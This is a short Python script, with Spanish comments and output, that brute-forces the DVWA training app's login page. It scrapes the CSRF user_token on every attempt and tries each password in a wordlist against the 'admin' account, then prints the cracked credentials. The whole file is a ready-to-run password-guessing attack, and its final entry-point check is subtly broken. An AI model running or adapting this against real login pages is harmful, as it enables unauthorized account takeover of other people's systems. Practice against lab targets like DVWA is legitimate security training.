# Login Bruteforce tool personalized for dvwa page
import requests
import re
from cmd import Cmd
import sys
import time

def bruteforce(url):
    session = requests.session()
    #open password file
    with open('pass.txt', 'r', encoding='latin-1') as file:
        content = file.readlines()
        passwords = [x.strip() for x in content]

        for password in passwords:
            login = session.get(f"{url}/login.php")
            user_token = re.search("'user_token' value='(.*?)'", login.text).group(1)
            #print(f"[*] User-token: {user_token}\n")
            post_data = {
                "username" : "admin",
                "password" : password,
                "Login" : "Login",
                "user_token" : user_token
            }
            validation = session.post(f"{url}/login.php", data=post_data)
            #print(validation.text)
            print(f"[**] {passwords.index(password)}")
            if "login_logo.png" in validation.text:
                pass
            elif "CSRF token is incorrect" in validation.text:
                print("CSRF token es incorrecto")
                sys.exit()
            else:
                print(f"[!!] Login Success!!!! \n [$]Pawneado: \n\t{post_data['username']}:{password}")
                print("De lokos")
                sys.exit()
        
        print("[!!!] No se ha encontrado la contraseña en el listado proporcionado ;(")

if __main__ == ("__main__"):
    url = str(input("[*]URL>> "))
    bruteforce(url)